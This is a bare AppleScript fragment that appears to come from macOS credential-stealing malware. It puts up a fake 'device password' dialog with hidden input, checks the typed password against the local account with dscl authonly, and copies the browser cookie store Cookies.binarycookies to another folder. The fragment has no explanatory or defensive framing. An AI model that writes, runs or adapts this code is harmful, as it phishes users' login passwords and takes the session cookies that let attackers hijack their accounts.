set response to display dialog "Please enter device password to continue." default answer "" with hidden answer with icon caution
set passwordText to text returned of response
do shell script "dscl . authonly " & quoted form of userName & space & quoted form of passwordText
duplicate file (cookieFolder & "Cookies.binarycookies.backup") to folder destination with replacing
